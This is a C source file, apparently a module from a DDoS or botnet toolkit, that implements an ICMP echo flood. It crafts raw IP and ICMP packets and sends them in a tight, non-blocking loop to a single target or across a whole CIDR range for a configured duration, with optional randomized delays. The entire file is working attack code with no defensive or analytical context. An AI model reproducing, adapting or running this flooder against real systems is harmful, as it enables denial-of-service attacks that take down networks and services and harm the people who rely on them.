#define _GNU_SOURCE
#include "headers/attack_params.h"

void* icmp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return NULL;

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sock);
        return NULL;
    }

    /* 8MB send buffer */
    int sndbuf = 8 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    const size_t ip_size   = sizeof(struct iphdr);
    const size_t icmp_size = sizeof(struct icmphdr);

    size_t base_size = params->len > 0 ? (size_t)params->len : 1024;
    if (base_size > 1450) base_size = 1450;
    size_t packet_size = ip_size + icmp_size + (base_size > icmp_size ? base_size - icmp_size : 0);

    unsigned char packet[1450];
    memset(packet, 0, sizeof(packet));

    struct iphdr   *iph   = (struct iphdr*)packet;
    struct icmphdr *icmph = (struct icmphdr*)(packet + ip_size);

    iph->ihl      = 5;
    iph->version  = 4;
    iph->tos      = 0;
    iph->tot_len  = htons((uint16_t)packet_size);
    iph->frag_off = 0;
    iph->ttl      = 64;
    iph->protocol = IPPROTO_ICMP;
    iph->saddr    = INADDR_ANY;
    iph->daddr    = params->target_addr.sin_addr.s_addr;

    icmph->type           = ICMP_ECHO;
    icmph->code           = 0;
    icmph->un.echo.id     = htons(0x1337);
    icmph->un.echo.sequence = 0;

    /* Pre-fill payload once */
    unsigned char *payload  = packet + ip_size + icmp_size;
    size_t payload_size     = packet_size - ip_size - icmp_size;
    if (params->msg_len > 0 && payload_size > 0) {
        size_t to_copy = (size_t)params->msg_len < payload_size
                         ? (size_t)params->msg_len : payload_size;
        memcpy(payload, params->msg, to_copy);
        for (size_t i = to_copy; i < payload_size; i++)
            payload[i] = (unsigned char)(i & 0xFF);
    } else {
        for (size_t i = 0; i < payload_size; i++)
            payload[i] = (unsigned char)(i & 0xFF);
    }

    int usleep_min = params->usleep_min > 0 ? params->usleep_min : 0;
    int usleep_max = params->usleep_max > 0 ? params->usleep_max : 0;
    int use_usleep  = usleep_min > 0;

    time_t end_time = time(NULL) + params->duration;
    uint64_t pkt = 0;

    /* Pre-compute IP checksum (daddr fixed unless CIDR) */
    iph->check = 0;
    iph->check = generic_checksum(iph, ip_size);

    if (params->cidr > 0) {
        uint32_t base  = ntohl(params->base_ip);
        uint32_t mask  = params->cidr == 32 ? 0xFFFFFFFF : (~0U << (32 - params->cidr));
        uint32_t start = base & mask;
        uint32_t end   = start | (~mask);
        struct sockaddr_in dest_addr = params->target_addr;

        while (params->active) {
            if ((pkt & 8191) == 0 && time(NULL) >= end_time) break;

            icmph->un.echo.sequence = htons((uint16_t)(pkt & 0xFFFF));
            icmph->checksum = 0;
            icmph->checksum = generic_checksum(icmph, icmp_size + payload_size);

            if (params->cidr == 32) {
                dest_addr.sin_addr.s_addr = htonl(start);
                iph->daddr = dest_addr.sin_addr.s_addr;
                iph->check = 0;
                iph->check = generic_checksum(iph, ip_size);
                sendto(sock, packet, packet_size, MSG_NOSIGNAL | MSG_DONTWAIT,
                       (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                pkt++;
            } else if (params->cidr == 31) {
                for (int pass = 0; pass < 2; pass++) {
                    dest_addr.sin_addr.s_addr = htonl(pass == 0 ? start : end);
                    iph->daddr = dest_addr.sin_addr.s_addr;
                    iph->check = 0;
                    iph->check = generic_checksum(iph, ip_size);
                    sendto(sock, packet, packet_size, MSG_NOSIGNAL | MSG_DONTWAIT,
                           (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                    pkt++;
                }
            } else {
                for (uint32_t ip = start + 1; ip < end; ++ip) {
                    dest_addr.sin_addr.s_addr = htonl(ip);
                    iph->daddr = dest_addr.sin_addr.s_addr;
                    iph->check = 0;
                    iph->check = generic_checksum(iph, ip_size);
                    sendto(sock, packet, packet_size, MSG_NOSIGNAL | MSG_DONTWAIT,
                           (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                    pkt++;
                }
                continue;
            }

            if (use_usleep) {
                int delay = usleep_min;
                if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1);
                usleep(delay);
            }
        }
    } else {
        while (params->active) {
            if ((pkt & 8191) == 0 && time(NULL) >= end_time) break;

            icmph->un.echo.sequence = htons((uint16_t)(pkt & 0xFFFF));
            icmph->checksum = 0;
            icmph->checksum = generic_checksum(icmph, icmp_size + payload_size);
            /* IP checksum stays the same (same daddr) — no need to recompute */
            sendto(sock, packet, packet_size, MSG_NOSIGNAL | MSG_DONTWAIT,
                   (struct sockaddr*)&params->target_addr, sizeof(params->target_addr));
            pkt++;

            if (use_usleep) {
                int delay = usleep_min;
                if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1);
                usleep(delay);
            }
        }
    }

    close(sock);
    return NULL;
}
